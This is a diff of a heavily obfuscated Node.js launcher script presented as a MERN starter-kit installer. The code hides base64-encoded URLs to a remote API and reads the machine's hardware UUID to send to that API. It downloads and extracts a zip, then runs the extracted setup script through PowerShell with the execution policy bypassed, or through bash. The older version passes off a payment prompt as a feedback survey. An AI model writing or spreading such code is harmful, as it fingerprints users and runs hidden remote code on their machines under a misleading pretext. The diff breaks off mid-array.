@@ -1,384 +1,383 @@
 #!/usr/bin/env node
 
-const a0_0x4cde78 = a0_0x3e2b;
-(function (_0x2ed1fd, _0x4f97e0) {
-  const _0x11f87f = a0_0x3e2b,
-    _0x396791 = _0x2ed1fd();
+const a0_0x32caa2 = a0_0xf510;
+(function (_0x2bd3db, _0x5d686b) {
+  const _0x4a6b22 = a0_0xf510,
+    _0x328878 = _0x2bd3db();
   while (!![]) {
     try {
-      const _0x4c0ed4 =
-        parseInt(_0x11f87f(0xc8)) / 0x1 +
-        parseInt(_0x11f87f(0xbb)) / 0x2 +
-        parseInt(_0x11f87f(0x9c)) / 0x3 +
-        -parseInt(_0x11f87f(0x96)) / 0x4 +
-        -parseInt(_0x11f87f(0xb2)) / 0x5 +
-        parseInt(_0x11f87f(0x94)) / 0x6 +
-        -parseInt(_0x11f87f(0xcc)) / 0x7;
-      if (_0x4c0ed4 === _0x4f97e0) break;
-      else _0x396791["push"](_0x396791["shift"]());
-    } catch (_0x22ed7d) {
-      _0x396791["push"](_0x396791["shift"]());
+      const _0x1b100d =
+        parseInt(_0x4a6b22(0x1b6)) / 0x1 +
+        -parseInt(_0x4a6b22(0x1a5)) / 0x2 +
+        (parseInt(_0x4a6b22(0x1a6)) / 0x3) *
+          (-parseInt(_0x4a6b22(0x18a)) / 0x4) +
+        parseInt(_0x4a6b22(0x1a9)) / 0x5 +
+        (-parseInt(_0x4a6b22(0x1ad)) / 0x6) *
+          (-parseInt(_0x4a6b22(0x1cf)) / 0x7) +
+        -parseInt(_0x4a6b22(0x1b4)) / 0x8 +
+        (parseInt(_0x4a6b22(0x199)) / 0x9) * (parseInt(_0x4a6b22(0x1bb)) / 0xa);
+      if (_0x1b100d === _0x5d686b) break;
+      else _0x328878["push"](_0x328878["shift"]());
+    } catch (_0x2aa8b1) {
+      _0x328878["push"](_0x328878["shift"]());
     }
   }
-})(a0_0x2680, 0xd09ea);
+})(a0_0x47bb, 0x40a90);
+function a0_0x47bb() {
+  const _0x4581db = [
+    "❌\x20Server\x20is\x20busy,\x20try\x20again\x20later!!",
+    "Press\x20\x1b[32mENTER\x1b[0m\x20to\x20proceed\x20with\x20the\x20payment.",
+    "36zJUxZA",
+    "inherit",
+    ".codeEaseX",
+    "ignore",
+    "push",
+    "linux",
+    "powershell.exe",
+    "log",
+    "ps1",
+    "aHR0cHM6Ly9ocnV0aGlrLmFwaS5hbm94LnN0b3JlL2FwaS92MS9wYXltZW50L3JlZ2lzdGVy",
+    "rmSync",
+    "setup",
+    "cmd",
+    "url",
+    "error",
+    "353223JwDGOr",
+    "🚨\x20Uncaught\x20Exception:",
+    "dirname",
+    "completed",
+    "mernLauncher",
+    "data",
+    "writeFileSync",
+    "ioreg\x20-rd1\x20-c\x20IOPlatformExpertDevice\x20|\x20awk\x20-F\x27\x22\x27\x20\x27/IOPlatformUUID/\x20{print\x20$4}\x27",
+    "✅\x20verified\x20user,\x20Proceeding...",
+    "✅\x20Payment\x20Successfull...",
+    "❌\x20Server\x20is\x20Busy,\x20try\x20again\x20later!!",
+    "message",
+    "922672JyxouN",
+    "75921pADVwi",
+    "trim",
+    "status",
+    "2559730KYMKIv",
+    "existsSync",
+    "setRawMode",
+    "-File",
+    "3804xjLHgB",
+    "Running\x20setup\x20for\x20",
+    "post",
+    "❌\x20Cleanup\x20failed:",
+    "\x22\x20>\x20/dev/null\x202>&1\x20&",
+    "...\x0a",
+    "readFileSync",
+    "3107928BxCgil",
+    "base64",
+    "190823MelDcO",
+    "Bypass",
+    "❌\x20Error\x20Invalid\x20License",
+    "nohup\x20xdg-open\x20\x22",
+    "split",
+    "110bVJCNR",
+    "from",
+    "win32",
+    "uncaughtException",
+    "homedir",
+    "Windows",
+    "success",
+    "exit",
+    "mern-launcher",
+    "stdin",
+    "aHR0cHM6Ly9ocnV0aGlrLmFub3guc3RvcmUvcGF5bWVudA==",
+    "platform",
+    "❌\x20Payment\x20check\x20timed\x20out.\x20Please\x20try\x20again.",
+    "✅\x20Successfully\x20completed!",
+    "\x0aRedirecting\x20to\x20payment\x20page...",
+    "toString",
+    "license",
+    "setup.zip",
+    "cat\x20/var/lib/dbus/machine-id",
+    "startsWith",
+    "2296nohtVL",
+    "wmic\x20csproduct\x20get\x20UUID",
+    "resume",
+    "\x0a\x20\x20\x20\x20=================================\x0a\x20\x20\x20\x20🚀\x20Welcome\x20to\x20the\x20MERN\x20Starter\x20Kit!\x0a\x20\x20\x20\x20Follow\x20the\x20prompts\x20to\x20configure\x20your\x20project.\x0a\x20\x20\x20\x20=================================\x0a\x20\x20",
+    "aHR0cHM6Ly9ocnV0aGlrLmFwaS5hbm94LnN0b3JlL2FwaS92MS9zY3JpcHRzL2Rvd25sb2FkLXppcA==",
+    "darwin",
+    "utf-8",
+    "arraybuffer",
+    "credentials",
+    "\x0a⚠️\x20\x20Process\x20interrupted.\x20Cleaning\x20up...",
+    "-ExecutionPolicy",
+    "unlinkSync",
+    "resolve",
+    "🔍\x20Checking,\x20Please\x20wait!!",
+    "join",
+  ];
+  a0_0x47bb = function () {
+    return _0x4581db;
+  };
+  return a0_0x47bb();
+}
 import { execSync, spawn } from "child_process";
-import a0_0x278ae4 from "os";
-import a0_0x197143 from "path";
+import a0_0x3959b7 from "os";
+import a0_0x3b69f4 from "path";
 import { fileURLToPath } from "url";
-import a0_0xbd4ec7 from "fs";
-import a0_0x557096 from "axios";
-import a0_0x4af511 from "adm-zip";
-const homePath = a0_0x278ae4[a0_0x4cde78(0xcd)](),
-  codeEasePath = a0_0x197143[a0_0x4cde78(0xd1)](homePath, a0_0x4cde78(0xba)),
-  __filename = fileURLToPath(import.meta[a0_0x4cde78(0xae)]),
-  __dirname = a0_0x197143[a0_0x4cde78(0xd5)](__filename),
-  packageDir = a0_0x197143[a0_0x4cde78(0xbd)](__dirname),
-  setupDir = a0_0x197143["join"](packageDir, a0_0x4cde78(0xc9)),
-  zipPath = a0_0x197143[a0_0x4cde78(0xd1)](packageDir, a0_0x4cde78(0x8f)),
-  package_name = a0_0x4cde78(0xd7);
+import a0_0x18decb from "fs";
+import a0_0x3bcc26 from "axios";
+import a0_0x48023b from "adm-zip";
+const homePath = a0_0x3959b7[a0_0x32caa2(0x1bf)](),
+  codeEasePath = a0_0x3b69f4["join"](homePath, a0_0x32caa2(0x18c)),
+  __filename = fileURLToPath(import.meta[a0_0x32caa2(0x197)]),
+  __dirname = a0_0x3b69f4[a0_0x32caa2(0x19b)](__filename),
+  packageDir = a0_0x3b69f4[a0_0x32caa2(0x185)](__dirname),
+  setupDir = a0_0x3b69f4[a0_0x32caa2(0x187)](packageDir, a0_0x32caa2(0x195)),
+  zipPath = a0_0x3b69f4[a0_0x32caa2(0x187)](packageDir, a0_0x32caa2(0x1cc)),
+  package_name = a0_0x32caa2(0x1c3);
+function a0_0xf510(_0x395d50, _0x41e7b5) {
+  const _0x47bbbd = a0_0x47bb();
+  return (
+    (a0_0xf510 = function (_0xf5101b, _0x23dc1) {
+      _0xf5101b = _0xf5101b - 0x17f;
+      let _0x5c0f32 = _0x47bbbd[_0xf5101b];
+      return _0x5c0f32;
+    }),
+    a0_0xf510(_0x395d50, _0x41e7b5)
+  );
+}
 function cleanup() {
-  const _0x3c0430 = a0_0x4cde78;
+  const _0x404730 = a0_0x32caa2;
   try {
-    a0_0xbd4ec7["existsSync"](zipPath) && a0_0xbd4ec7[_0x3c0430(0xa3)](zipPath),
-      a0_0xbd4ec7[_0x3c0430(0xa4)](setupDir) &&
-        a0_0xbd4ec7[_0x3c0430(0xbf)](setupDir, {
+    a0_0x18decb[_0x404730(0x1aa)](zipPath) &&
+      a0_0x18decb[_0x404730(0x184)](zipPath),
+      a0_0x18decb[_0x404730(0x1aa)](setupDir) &&
+        a0_0x18decb[_0x404730(0x194)](setupDir, {
           recursive: !![],
           force: !![],
         }),
-      console[_0x3c0430(0xaa)]("✅\x20Successfully\x20completed!");
-  } catch (_0x16e9a5) {
-    console[_0x3c0430(0xb1)]("❌\x20Cleanup\x20failed:", _0x16e9a5["message"]);
+      console["log"](_0x404730(0x1c8));
+  } catch (_0x4a74cc) {
+    console[_0x404730(0x198)](_0x404730(0x1b0), _0x4a74cc[_0x404730(0x1a4)]);
   }
 }
 async function generateUUID() {
-  const _0x4b197e = a0_0x4cde78;
-  let _0x35f379;
-  if (a0_0x278ae4[_0x4b197e(0xa7)]() === _0x4b197e(0xb9))
-    _0x35f379 = execSync(_0x4b197e(0xb4))
-      [_0x4b197e(0xa0)]()
-      [_0x4b197e(0x9a)]("\x0a")[0x1]
-      [_0x4b197e(0xc1)]();
+  const _0x3a37c5 = a0_0x32caa2;
+  let _0x354355;
+  if (a0_0x3959b7["platform"]() === _0x3a37c5(0x1bd))
+    _0x354355 = execSync(_0x3a37c5(0x1d0))
+      [_0x3a37c5(0x1ca)]()
+      [_0x3a37c5(0x1ba)]("\x0a")[0x1]
+      ["trim"]();
   else {
-    if (a0_0x278ae4[_0x4b197e(0xa7)]() === "linux")
-      _0x35f379 = execSync("cat\x20/var/lib/dbus/machine-id")
-        [_0x4b197e(0xa0)]()
-        [_0x4b197e(0xc1)]();
+    if (a0_0x3959b7[_0x3a37c5(0x1c6)]() === _0x3a37c5(0x18f))
+      _0x354355 = execSync(_0x3a37c5(0x1cd))["toString"]()[_0x3a37c5(0x1a7)]();
     else
-      a0_0x278ae4[_0x4b197e(0xa7)]() === _0x4b197e(0xcb) &&
-        (_0x35f379 = execSync(_0x4b197e(0xce))
-          [_0x4b197e(0xa0)]()
-          [_0x4b197e(0xc1)]());
+      a0_0x3959b7[_0x3a37c5(0x1c6)]() === _0x3a37c5(0x1d4) &&
+        (_0x354355 = execSync(_0x3a37c5(0x1a0))
+          [_0x3a37c5(0x1ca)]()
+          [_0x3a37c5(0x1a7)]());
   }
-  return _0x35f379;
+  return _0x354355;
 }
-function getLicenseToken(_0x15dd2b) {
-  const _0x38bb2e = a0_0x4cde78;
-  if (!a0_0xbd4ec7[_0x38bb2e(0xa4)](codeEasePath)) return null;
-  const _0x1be5d5 = a0_0xbd4ec7["readFileSync"](codeEasePath, _0x38bb2e(0xdb))[
-    _0x38bb2e(0x9a)
-  ]("\x0a");
-  for (const _0x43b4fe of _0x1be5d5) {
-    if (_0x43b4fe["startsWith"](_0x15dd2b + "="))
-      return _0x43b4fe["split"]("=")[0x1][_0x38bb2e(0xc1)]();
+function getLicenseToken(_0x535f62) {
+  const _0x5660a9 = a0_0x32caa2;
+  if (!a0_0x18decb[_0x5660a9(0x1aa)](codeEasePath)) return null;
+  const _0x2d2998 = a0_0x18decb[_0x5660a9(0x1b3)](
+    codeEasePath,
+    _0x5660a9(0x17f)
+  )[_0x5660a9(0x1ba)]("\x0a");
+  for (const _0x542373 of _0x2d2998) {
+    if (_0x542373[_0x5660a9(0x1ce)](_0x535f62 + "="))
+      return _0x542373[_0x5660a9(0x1ba)]("=")[0x1][_0x5660a9(0x1a7)]();
   }
   return null;
 }
-function saveLicenseToken(_0x108913, _0x41474d) {
-  const _0x6f6153 = a0_0x4cde78;
-  let _0x4b0676 = [],
-    _0x1b85d0 = ![];
-  if (a0_0xbd4ec7[_0x6f6153(0xa4)](codeEasePath)) {
-    const _0x1717fd = a0_0xbd4ec7[_0x6f6153(0xa8)](
-      codeEasePath,
-      _0x6f6153(0xdb)
-    )[_0x6f6153(0x9a)]("\x0a");
-    for (const _0x40dd00 of _0x1717fd) {
-      _0x40dd00[_0x6f6153(0xc2)](_0x108913 + "=")
-        ? (_0x4b0676[_0x6f6153(0xcf)](_0x108913 + "=" + _0x41474d),
-          (_0x1b85d0 = !![]))
-        : _0x4b0676[_0x6f6153(0xcf)](_0x40dd00);
+function saveLicenseToken(_0x5ce2af, _0x3626d8) {
+  const _0xc487cb = a0_0x32caa2;
+  let _0x354e35 = [],
+    _0x1c5768 = ![];
+  if (a0_0x18decb[_0xc487cb(0x1aa)](codeEasePath)) {
+    const _0x407a2a = a0_0x18decb["readFileSync"](codeEasePath, "utf-8")[
+      _0xc487cb(0x1ba)
+    ]("\x0a");
+    for (const _0x541485 of _0x407a2a) {
+      _0x541485["startsWith"](_0x5ce2af + "=")
+        ? (_0x354e35[_0xc487cb(0x18e)](_0x5ce2af + "=" + _0x3626d8),
+          (_0x1c5768 = !![]))
+        : _0x354e35[_0xc487cb(0x18e)](_0x541485);
     }
   }
-  !_0x1b85d0 && _0x4b0676[_0x6f6153(0xcf)](_0x108913 + "=" + _0x41474d),
-    a0_0xbd4ec7[_0x6f6153(0x97)](codeEasePath, _0x4b0676["join"]("\x0a"));
+  !_0x1c5768 && _0x354e35["push"](_0x5ce2af + "=" + _0x3626d8),
+    a0_0x18decb[_0xc487cb(0x19f)](
+      codeEasePath,
+      _0x354e35[_0xc487cb(0x187)]("\x0a")
+    );
 }
-function a0_0x3e2b(_0x1f34d2, _0x1ba485) {
-  const _0x268023 = a0_0x2680();
-  return (
-    (a0_0x3e2b = function (_0x3e2b9d, _0x231344) {
-      _0x3e2b9d = _0x3e2b9d - 0x8b;
-      let _0x321fc4 = _0x268023[_0x3e2b9d];
-      return _0x321fc4;
-    }),
-    a0_0x3e2b(_0x1f34d2, _0x1ba485)
-  );
-}
-async function installProject(_0xdbafe4) {
-  const _0x4d6d7c = a0_0x4cde78;
+async function installProject(_0x35bd6f) {
+  const _0x55c8fd = a0_0x32caa2;
   try {
-    const _0x58ec55 = getLicenseToken(_0xdbafe4);
-    if (!_0x58ec55) {
-      console[_0x4d6d7c(0xaa)](_0x4d6d7c(0xc3) + _0xdbafe4 + ".");
+    const _0x24a794 = getLicenseToken(_0x35bd6f);
+    if (!_0x24a794) {
+      console["log"](
+        "Please\x20purchase\x20a\x20license\x20" + _0x35bd6f + "."
+      );
       return;
     }
-    const _0x237d20 = await a0_0x557096[_0x4d6d7c(0x92)](
-      Buffer[_0x4d6d7c(0xa6)](
-        "aHR0cHM6Ly9ocnV0aGlrLmFwaS5hbm94LnN0b3JlL2FwaS92MS9zY3JpcHRzL2Rvd25sb2FkLXppcA==",
-        _0x4d6d7c(0x91)
-      )["toString"](_0x4d6d7c(0xdb)),
+    const _0x57a085 = await a0_0x3bcc26["post"](
+      Buffer[_0x55c8fd(0x1bc)](_0x55c8fd(0x1d3), _0x55c8fd(0x1b5))[
+        _0x55c8fd(0x1ca)
+      ](_0x55c8fd(0x17f)),
       {
-        licenseToken: _0x58ec55,
-        project: _0x4d6d7c(0xbc),
-        packageName: _0xdbafe4,
+        licenseToken: _0x24a794,
+        project: _0x55c8fd(0x19d),
+        packageName: _0x35bd6f,
       },
-      { responseType: _0x4d6d7c(0xb6) }
+      { responseType: _0x55c8fd(0x180) }
     );
-    a0_0xbd4ec7[_0x4d6d7c(0x97)](zipPath, _0x237d20["data"]);
-    const _0x10e97f = new a0_0x4af511(zipPath);
-    _0x10e97f[_0x4d6d7c(0xb5)](setupDir, !![]);
-  } catch (_0x206aa9) {
-    console["log"](_0x4d6d7c(0xa1)), process[_0x4d6d7c(0xd8)](0x1);
+    a0_0x18decb[_0x55c8fd(0x19f)](zipPath, _0x57a085[_0x55c8fd(0x19e)]);
+    const _0x33f321 = new a0_0x48023b(zipPath);
+    _0x33f321["extractAllTo"](setupDir, !![]);
+  } catch (_0x4a225d) {
+    console[_0x55c8fd(0x191)](_0x55c8fd(0x1a3)), process[_0x55c8fd(0x1c2)](0x1);
   }
 }
-async function checkLicense(_0xea20d8) {
-  const _0x2e15a4 = a0_0x4cde78;
+async function checkLicense(_0x2c7020) {
+  const _0x143578 = a0_0x32caa2;
   try {
-    let _0x309964 = getLicenseToken(_0xea20d8);
-    if (_0x309964) {
-      const _0x4de2da = await generateUUID(),
-        _0x3aeaa7 = await a0_0x557096[_0x2e15a4(0x92)](
-          Buffer[_0x2e15a4(0xa6)](
+    let _0x449b41 = getLicenseToken(_0x2c7020);
+    if (_0x449b41) {
+      const _0x31ef2f = await generateUUID(),
+        _0x38a9cd = await a0_0x3bcc26[_0x143578(0x1af)](
+          Buffer["from"](
             "aHR0cHM6Ly9ocnV0aGlrLmFwaS5hbm94LnN0b3JlL2FwaS92MS9wYXltZW50L2NoZWNrLXBheW1lbnQ=",
-            _0x2e15a4(0x91)
-          )["toString"](_0x2e15a4(0xdb)),
-          { packageName: _0xea20d8 },
-          { headers: { "X-License-Key": _0x4de2da } }
+            _0x143578(0x1b5)
+          )[_0x143578(0x1ca)](_0x143578(0x17f)),
+          { packageName: _0x2c7020 },
+          { headers: { "X-License-Key": _0x31ef2f } }
         );
       if (
-        _0x3aeaa7[_0x2e15a4(0xad)][_0x2e15a4(0xd9)][_0x2e15a4(0xb7)] ===
-        "completed"
+        _0x38a9cd[_0x143578(0x19e)][_0x143578(0x181)][_0x143578(0x1a8)] ===
+        _0x143578(0x19c)
       )
-        return console[_0x2e15a4(0xaa)](_0x2e15a4(0xc6)), !![];
+        return console["log"](_0x143578(0x1a1)), !![];
     }
-    const _0x1db9b6 = await generateUUID(),
-      _0x5ac953 = await a0_0x557096[_0x2e15a4(0x92)](
-        Buffer["from"](_0x2e15a4(0xb0), _0x2e15a4(0x91))["toString"](
-          _0x2e15a4(0xdb)
-        ),
-        { packageName: _0xea20d8 },
-        { headers: { "X-License-Key": _0x1db9b6 } }
+    const _0x167903 = await generateUUID(),
+      _0x4a51cb = await a0_0x3bcc26[_0x143578(0x1af)](
+        Buffer[_0x143578(0x1bc)](_0x143578(0x193), _0x143578(0x1b5))[
+          _0x143578(0x1ca)
+        ](_0x143578(0x17f)),
+        { packageName: _0x2c7020 },
+        { headers: { "X-License-Key": _0x167903 } }
       );
-    if (_0x5ac953["data"][_0x2e15a4(0xaf)])
+    if (_0x4a51cb[_0x143578(0x19e)][_0x143578(0x1c1)])
       return (
-        console[_0x2e15a4(0xaa)](
-          "Before\x20Proceeding,\x20Please\x20answer\x20few\x20questions\x20by\x20pressing\x20\x1b[32mENTER\x1b[0m\x20to\x20help\x20us\x20improve."
-        ),
-        process[_0x2e15a4(0xa9)][_0x2e15a4(0xd4)](!![]),
-        process["stdin"][_0x2e15a4(0x9d)](),
-        new Promise((_0x15eed7) => {
-          const _0x1c7cc8 = _0x2e15a4;
-          process[_0x1c7cc8(0xa9)]["on"]("data", async () => {
-            const _0x51e78c = _0x1c7cc8;
-            process[_0x51e78c(0xa9)][_0x51e78c(0xd4)](![]),
-              process["stdin"]["pause"](),
-              console["log"](_0x51e78c(0xc4));
-            const _0x2c99c1 =
-              Buffer[_0x51e78c(0xa6)](_0x51e78c(0x98), "base64")["toString"](
-                _0x51e78c(0xdb)
+        console[_0x143578(0x191)](_0x143578(0x189)),
+        process[_0x143578(0x1c4)][_0x143578(0x1ab)](!![]),
+        process["stdin"][_0x143578(0x1d1)](),
+        new Promise((_0x1ceef7) => {
+          const _0x1ffa54 = _0x143578;
+          process[_0x1ffa54(0x1c4)]["on"]("data", async () => {
+            const _0x4e9ef9 = _0x1ffa54;
+            process[_0x4e9ef9(0x1c4)][_0x4e9ef9(0x1ab)](![]),
+              process[_0x4e9ef9(0x1c4)]["pause"](),
+              console[_0x4e9ef9(0x191)](_0x4e9ef9(0x1c9));
+            const _0x38ecfd =
+              Buffer[_0x4e9ef9(0x1bc)](_0x4e9ef9(0x1c5), "base64")["toString"](
+                "utf-8"
               ) +
               "/" +
               package_name +
               "/" +
-              _0x1db9b6;
-            if (a0_0x278ae4[_0x51e78c(0xa7)]() === _0x51e78c(0xb9))
-              execSync(_0x51e78c(0xd3) + _0x2c99c1 + "\x22", {
-                stdio: _0x51e78c(0x8e),
+              _0x167903;
+            if (a0_0x3959b7[_0x4e9ef9(0x1c6)]() === _0x4e9ef9(0x1bd))
+              execSync("start\x20\x22\x22\x20\x22" + _0x38ecfd + "\x22", {
+                stdio: _0x4e9ef9(0x18d),
               });
             else
-              a0_0x278ae4[_0x51e78c(0xa7)]() === _0x51e78c(0xcb)
-                ? execSync(_0x51e78c(0xab) + _0x2c99c1 + "\x22", {
-                    stdio: _0x51e78c(0x8e),
+              a0_0x3959b7[_0x4e9ef9(0x1c6)]() === "darwin"
+                ? execSync("open\x20\x22" + _0x38ecfd + "\x22", {
+                    stdio: "ignore",
                     detached: !![],
                   })
-                : execSync(
-                    _0x51e78c(0xbe) +
-                      _0x2c99c1 +
-                      "\x22\x20>\x20/dev/null\x202>&1\x20&",
-                    { stdio: _0x51e78c(0x8e), detached: !![] }
-                  );
-            console["log"](_0x51e78c(0x9f));
-            let _0x24ad8f = ![],
-              _0x5f3c84 = 0x0;
-            const _0x209d90 = 0x2d;
-            while (!_0x24ad8f && _0x5f3c84 < _0x209d90) {
-              await new Promise((_0x17ea5f) => setTimeout(_0x17ea5f, 0x3a98)),
-                _0x5f3c84++;
-              const _0x34f39a = await a0_0x557096["post"](
-                Buffer[_0x51e78c(0xa6)](
+                : execSync(_0x4e9ef9(0x1b9) + _0x38ecfd + _0x4e9ef9(0x1b1), {
+                    stdio: _0x4e9ef9(0x18d),
+                    detached: !![],
+                  });
+            console["log"](
+              "🔄\x20Waiting\x20for\x20payment\x20confirmation..."
+            );
+            let _0x46cdfd = ![],
+              _0x216507 = 0x0;
+            const _0x4229a5 = 0x2d;
+            while (!_0x46cdfd && _0x216507 < _0x4229a5) {
+              await new Promise((_0x2a1ad1) => setTimeout(_0x2a1ad1, 0x3a98)),
+                _0x216507++;
+              const _0x621cdf = await a0_0x3bcc26[_0x4e9ef9(0x1af)](
+                Buffer[_0x4e9ef9(0x1bc)](
                   "aHR0cHM6Ly9ocnV0aGlrLmFwaS5hbm94LnN0b3JlL2FwaS92MS9wYXltZW50L2NoZWNrLXBheW1lbnQ=",
-                  _0x51e78c(0x91)
-                )[_0x51e78c(0xa0)](_0x51e78c(0xdb)),
-                { packageName: _0xea20d8 },
-                { headers: { "X-License-Key": _0x1db9b6 } }
+                  _0x4e9ef9(0x1b5)
+                )["toString"](_0x4e9ef9(0x17f)),
+                { packageName: _0x2c7020 },
+                { headers: { "X-License-Key": _0x167903 } }
               );
-              console[_0x51e78c(0xaa)](_0x51e78c(0x95));
+              console[_0x4e9ef9(0x191)](_0x4e9ef9(0x186));
               if (
-                _0x34f39a[_0x51e78c(0xad)][_0x51e78c(0xd9)][_0x51e78c(0xb7)] ===
-                _0x51e78c(0xc0)
+                _0x621cdf["data"][_0x4e9ef9(0x181)][_0x4e9ef9(0x1a8)] ===
+                "completed"
               )
                 return (
                   saveLicenseToken(
-                    _0xea20d8,
-                    _0x34f39a[_0x51e78c(0xad)][_0x51e78c(0xd9)][_0x51e78c(0xca)]
+                    _0x2c7020,
+                    _0x621cdf[_0x4e9ef9(0x19e)]["credentials"][_0x4e9ef9(0x1cb)]
                   ),
-                  console[_0x51e78c(0xaa)](_0x51e78c(0xb8)),
-                  (_0x24ad8f = !![]),
-                  _0x15eed7(!![]),
+                  console[_0x4e9ef9(0x191)](_0x4e9ef9(0x1a2)),
+                  (_0x46cdfd = !![]),
+                  _0x1ceef7(!![]),
                   !![]
                 );
             }
-            console[_0x51e78c(0xaa)](_0x51e78c(0xd0)),
-              process[_0x51e78c(0xd8)](0x1);
+            console[_0x4e9ef9(0x191)](_0x4e9ef9(0x1c7)), process["exit"](0x1);
           });
         })
       );
-  } catch (_0x47ccfc) {
-    console[_0x2e15a4(0xaa)](_0x2e15a4(0xc7)), process[_0x2e15a4(0xd8)](0x1);
+  } catch (_0x381ed8) {
+    console[_0x143578(0x191)](_0x143578(0x188)), process[_0x143578(0x1c2)](0x1);
   }
 }
 async function main() {
-  const _0x2d558c = a0_0x4cde78;
-  console[_0x2d558c(0xaa)](_0x2d558c(0x8b));
-  const _0x1cfbc4 = await checkLicense(package_name);
-  !_0x1cfbc4 && console[_0x2d558c(0xaa)](_0x2d558c(0x9e));
+  const _0xe6fc07 = a0_0x32caa2;
+  console[_0xe6fc07(0x191)](_0xe6fc07(0x1d2));
+  const _0x109e76 = await checkLicense(package_name);
+  !_0x109e76 && console[_0xe6fc07(0x191)](_0xe6fc07(0x1b8));
   await installProject(package_name);
-  const _0x50768d = a0_0x278ae4[_0x2d558c(0xa7)](),
-    _0x2c1c16 =
-      _0x50768d === "win32"
-        ? a0_0x197143[_0x2d558c(0xd1)](
-            setupDir,
-            _0x2d558c(0xac),
-            _0x2d558c(0x8d)
-          )
-        : a0_0x197143[_0x2d558c(0xd1)](
-            setupDir,
-            _0x2d558c(0xa2),
-            _0x2d558c(0x93)
-          ),
-    _0x25e7f9 = a0_0x197143[_0x2d558c(0xbd)](__dirname, _0x2c1c16);
-  console[_0x2d558c(0xaa)](
-    "Running\x20setup\x20for\x20" +
-      (_0x50768d === _0x2d558c(0xb9) ? _0x2d558c(0xd2) : "Linux/macOS") +
-      "...\x0a"
+  const _0x53afca = a0_0x3959b7[_0xe6fc07(0x1c6)](),
+    _0x4a6d6a =
+      _0x53afca === _0xe6fc07(0x1bd)
+        ? a0_0x3b69f4[_0xe6fc07(0x187)](setupDir, _0xe6fc07(0x192), "setup.ps1")
+        : a0_0x3b69f4["join"](setupDir, _0xe6fc07(0x196), "setup.sh"),
+    _0x37caf4 = a0_0x3b69f4[_0xe6fc07(0x185)](__dirname, _0x4a6d6a);
+  console[_0xe6fc07(0x191)](
+    _0xe6fc07(0x1ae) +
+      (_0x53afca === "win32" ? _0xe6fc07(0x1c0) : "Linux/macOS") +
+      _0xe6fc07(0x1b2)
   ),
     spawn(
-      _0x50768d === _0x2d558c(0xb9) ? _0x2d558c(0xda) : _0x2d558c(0x90),
-      _0x50768d === _0x2d558c(0xb9)
-        ? [_0x2d558c(0xd6), "Bypass", _0x2d558c(0x8c), _0x25e7f9]
-        : [_0x25e7f9],
-      { stdio: _0x2d558c(0x99) }
+      _0x53afca === _0xe6fc07(0x1bd) ? _0xe6fc07(0x190) : "bash",
+      _0x53afca === _0xe6fc07(0x1bd)
+        ? [_0xe6fc07(0x183), _0xe6fc07(0x1b7), _0xe6fc07(0x1ac), _0x37caf4]
+        : [_0x37caf4],
+      { stdio: _0xe6fc07(0x18b) }
     );
 }
-process["on"](a0_0x4cde78(0xd8), cleanup),
-  process["on"](a0_0x4cde78(0xb3), () => {
-    const _0x4a0fa0 = a0_0x4cde78;
-    console[_0x4a0fa0(0xaa)](_0x4a0fa0(0x9b)),
+process["on"](a0_0x32caa2(0x1c2), cleanup),
+  process["on"]("SIGINT", () => {
+    const _0x576fc2 = a0_0x32caa2;
+    console[_0x576fc2(0x191)](_0x576fc2(0x182)),
       cleanup(),
-      process[_0x4a0fa0(0xd8)](0x1);
+      process[_0x576fc2(0x1c2)](0x1);
   }),
-  process["on"](a0_0x4cde78(0xa5), (_0x24069a) => {
-    const _0xe1d806 = a0_0x4cde78;
-    console[_0xe1d806(0xb1)](_0xe1d806(0xc5), _0x24069a),
+  process["on"](a0_0x32caa2(0x1be), (_0x2aaa8f) => {
+    const _0x5d5462 = a0_0x32caa2;
+    console["error"](_0x5d5462(0x19a), _0x2aaa8f),
       cleanup(),
-      process[_0xe1d806(0xd8)](0x1);
+      process["exit"](0x1);
   }),
   main();
-function a0_0x2680() {
-  const _0x226c84 = [
-    "SIGINT",
-    "wmic\x20csproduct\x20get\x20UUID",
-    "extractAllTo",
-    "arraybuffer",
-    "FeedbackStatus",
-    "✅\x20Feedback\x20Successfull...",
-    "win32",
-    ".codeEase",
-    "1879192QIfPsw",
-    "mernLauncher",
-    "resolve",
-    "nohup\x20xdg-open\x20\x22",
-    "rmSync",
-    "completed",
-    "trim",
-    "startsWith",
-    "Please\x20purchase\x20a\x20license\x20",
-    "\x0aRedirecting\x20to\x20feedback\x20page...",
-    "🚨\x20Uncaught\x20Exception:",
-    "✅\x20verified\x20user,\x20Proceeding...",
-    "❌\x20Server\x20is\x20busy,\x20try\x20again\x20later!!",
-    "1005576WUTieh",
-    "setup",
-    "license",
-    "darwin",
-    "11509575BBfDSs",
-    "homedir",
-    "ioreg\x20-rd1\x20-c\x20IOPlatformExpertDevice\x20|\x20awk\x20-F\x27\x22\x27\x20\x27/IOPlatformUUID/\x20{print\x20$4}\x27",
-    "push",
-    "❌\x20Payment\x20check\x20timed\x20out.\x20Please\x20try\x20again.",
-    "join",
-    "Windows",
-    "start\x20\x22\x22\x20\x22",
-    "setRawMode",
-    "dirname",
-    "-ExecutionPolicy",
-    "mern-launcher",
-    "exit",
-    "credentials",
-    "powershell.exe",
-    "utf-8",
-    "\x0a\x20\x20\x20\x20=================================\x0a\x20\x20\x20\x20🚀\x20Welcome\x20to\x20the\x20MERN\x20Starter\x20Kit!\x0a\x20\x20\x20\x20Follow\x20the\x20prompts\x20to\x20configure\x20your\x20project.\x0a\x20\x20\x20\x20=================================\x0a\x20\x20",
-    "-File",
-    "setup.ps1",
-    "ignore",
-    "setup.zip",
-    "bash",
-    "base64",
-    "post",
-    "setup.sh",
-    "5885148XrnMxT",
-    "🔍\x20Checking,\x20Please\x20wait!!",
-    "5919208txkWVN",
-    "writeFileSync",
-    "aHR0cHM6Ly9ocnV0aGlrLmFub3guc3RvcmUvZmVlZGJhY2s=",
-    "inherit",
-    "split",
-    "\x0a⚠️\x20\x20Process\x20interrupted.\x20Cleaning\x20up...",
-    "3958104zausMw",
-    "resume",
-    "❌\x20Error\x20Invalid\x20License",
-    "🔄\x20Waiting\x20for\x20feedback\x20confirmation...",
-    "toString",
-    "❌\x20Server\x20is\x20Busy,\x20try\x20again\x20later!!",
-    "cmd",
-    "unlinkSync",
-    "existsSync",
-    "uncaughtException",
-    "from",
-    "platform",
-    "readFileSync",
-    "stdin",
-    "log",
-    "open\x20\x22",
-    "ps1",
-    "data",
-    "url",
-    "success",
